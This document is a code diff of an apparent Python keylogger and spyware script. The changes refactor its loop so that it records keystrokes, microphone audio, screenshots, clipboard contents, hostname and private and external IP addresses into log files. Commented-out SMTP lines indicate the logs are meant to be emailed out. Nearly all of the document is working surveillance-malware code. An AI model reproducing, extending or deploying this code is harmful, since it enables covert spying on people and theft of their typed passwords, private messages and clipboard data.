@@ -29,6 +29,8 @@ from PIL import ImageGrab
 
 from datetime import datetime
 
+import sys
+
 # OS information fetch
 
 current_OS = platform.system()
@@ -75,35 +77,6 @@ keys_information = "key_log.txt"
 # smtp_session.sendmail(sender_email, receiver_email, message)
 # smtp_session.quit()
 
-# Computer Information
-
-# hostname = socket.gethostname()
-# internal_IP = socket.gethostbyname(hostname) # Usually returns loopback address
-
-# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
-# s.connect(("8.8.8.8", 80))
-# private_IP = s.getsockname()[0] # Will return the private IP of the machine
-
-# external_IP = get('https://api.ipify.org').text
-
-# processor_info = platform.processor()
-# system_info, system_ver = platform.system(), platform.version()
-# machine_info = platform.machine()
-
-# f = open(system_information, 'a')
-
-# f.write('Hostname: ' + hostname + '\n' +
-#         'Internal IP: ' + internal_IP + '\n' +
-#         'Private IP: ' + private_IP + '\n' +
-#         'External IP: ' + external_IP + '\n' +
-#         'Processor Info: ' + processor_info + '\n' +
-#         'System Info: ' + system_info + '\n' + 
-#         'System Version: ' + system_ver + '\n' +
-#         'Machine Info: ' + machine_info + '\n' +
-#         'Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
-
-# f.close()
-
 # Timer
 
 #current_date_time = datetime.now().time() # This provides human readable time. But for mathematical simplicity we use time.time()
@@ -119,9 +92,9 @@ def on_press_func(key):
             if time.time() > stopping_time:
                 listener.stop()
             else:
-                f.write(key.char)
+                key_f.write(key.char)
         except AttributeError:
-            f.write('(' + str(key) + ')')
+            key_f.write('(' + str(key) + ')')
 
 def take_screenshot(file_name):
     screenshot = ImageGrab.grab()
@@ -131,6 +104,36 @@ def take_screenshot(file_name):
 
 while current_iteration < no_of_iterations:
 
+    # System Information
+
+    sys_details = {}
+
+    sys_details.update({'architecture' : platform.architecture()})
+    sys_details.update({'system_info' : platform.system()})
+    sys_details.update({'uname' : platform.uname()})
+    sys_details.update({'hostname' : socket.gethostname()})
+
+    # print(sys_details.items())
+
+    # sys_details[internal_IP] = socket.gethostbyname(hostname) # Usually returns loopback address
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
+    s.connect(("8.8.8.8", 80))
+
+    sys_details.update({'private_IP' : s.getsockname()[0] }) # Will return the private IP of the machine
+    sys_details.update({'external_IP' : get('https://api.ipify.org').text})
+
+    sys_f = open(logpath + file_prefix + system_information, 'a')
+
+    for item in sys_details.items():
+        sys_f.write(str(item) + '\n\n')
+
+    sys_f.write('Clipboard Contents: ' + '\n\t' + clipboard.paste() + '\n')
+
+    sys_f.close()
+
+    # Keylogging, Microphone Capture and Screenshotting
+
     sampling_freq = 44100
     duration = iteration_duration
 
@@ -138,7 +141,7 @@ while current_iteration < no_of_iterations:
 
     take_screenshot(screenshot_information_beg)
 
-    f = open(logpath + file_prefix + keys_information, 'a')
+    key_f = open(logpath + file_prefix + keys_information, 'a')
 
     stopping_time = time.time() + iteration_duration
     
@@ -146,7 +149,7 @@ while current_iteration < no_of_iterations:
             on_press=on_press_func) as listener:
         listener.join()
 
-    f.close()
+    key_f.close()
     sd.wait()
 
     write(logpath + file_prefix + audio_information, sampling_freq, myrecording)
@@ -154,6 +157,8 @@ while current_iteration < no_of_iterations:
     take_screenshot(screenshot_information_end)
 
     current_iteration += 1
+
+sys.exit()
 
     # if time.time() > stopping_time:
     #     pass
